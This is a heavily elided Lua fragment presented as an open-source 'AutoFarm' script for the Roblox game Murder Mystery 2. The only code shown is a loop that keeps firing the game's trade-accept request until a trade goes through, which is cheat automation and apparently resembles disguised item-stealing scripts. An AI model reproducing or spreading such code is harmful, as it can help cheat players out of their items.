-- Open Source Script AutoFarm murder mystery 2 Summer update 202666
...
local InsIt=function()
 ...
 task.spawn(function()
  ...
  if tA and TP then
   while not acc do pcall(function() RS.Trade.AcceptRequest:FireServer(tA) end) acc=not TP.Enabled task.wait(0.05) end
